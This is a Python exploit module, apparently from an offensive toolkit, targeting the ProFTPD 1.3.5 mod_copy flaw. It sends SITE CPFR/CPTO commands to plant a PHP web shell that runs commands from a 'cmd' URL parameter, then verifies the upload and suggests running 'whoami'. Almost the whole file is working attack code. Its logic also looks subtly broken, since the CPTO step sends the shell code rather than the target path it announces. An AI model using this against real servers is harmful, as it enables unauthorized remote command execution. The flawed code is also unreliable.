import socket
import requests
from core.base_module import BaseModule
from rich.console import Console

class Proftpd135Rce(BaseModule):
    """Exploits the ProFTPD 1.3.5 mod_copy RCE vulnerability."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['127.0.0.1', 'The remote host running ProFTPD.'],
            'RPORT': ['21', 'The remote port of the ProFTPD service.'],
            'WEB_ROOT': ['/var/www/html', 'The absolute path to the web server root directory.'],
            'PHP_SHELL': ['<?php system($_GET[\'cmd\']); ?>', 'The PHP code for the shell.']
        }

    def run(self, options):
        """
        Executes the ProFTPD RCE exploit.
        """
        rhost = options.get('RHOST')
        rport_str = options.get('RPORT')
        web_root = options.get('WEB_ROOT')
        php_shell = options.get('PHP_SHELL')
        console = Console()

        try:
            rport = int(rport_str)
        except ValueError:
            console.print("[!] Invalid RPORT. Must be an integer.", style="bold red")
            return

        shell_filename = "pysploitx_shell.php"
        target_path = f"{web_root}/{shell_filename}"

        try:
            console.print(f"[*] Attempting to exploit ProFTPD 1.3.5 on {rhost}:{rport}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((rhost, rport))
                banner = s.recv(1024).decode(errors='ignore').strip()
                console.print(f"[+] Connected. Banner: {banner}")

                # Use mod_copy to write the shell
                console.print(f"[*] Sending SITE CPFR command to select a source file.")
                s.send(b'SITE CPFR /proc/self/cmdline\n')
                s.recv(1024)

                console.print(f"[*] Sending SITE CPTO command to write the PHP shell to {target_path}.")
                s.send(f'SITE CPTO {php_shell}\n'.encode())
                s.recv(1024)

            console.print("[*] Exploit commands sent. Now checking if the shell was created.")
            shell_url = f"http://{rhost}/{shell_filename}"
            
            # Verify shell upload
            response = requests.get(shell_url, timeout=10)
            if response.status_code == 200 and 'system($_GET' in response.text:
                console.print(f"[bold green][+] Success! Shell uploaded to {shell_url}[/bold green]")
                console.print(f"[bold green][+] You can now execute commands, e.g.: {shell_url}?cmd=whoami[/bold green]")
            else:
                console.print(f"[bold red][-] Exploit failed. Could not verify shell upload at {shell_url}.[/bold red]")
                console.print(f"[red]    Status: {response.status_code}, Response: {response.text[:100]}[/red]")

        except socket.timeout:
            console.print("[!] Connection timed out.", style="bold red")
        except socket.error as e:
            console.print(f"[!] Socket error: {e}", style="bold red")
        except requests.RequestException as e:
            console.print(f"[!] Web request to verify shell failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
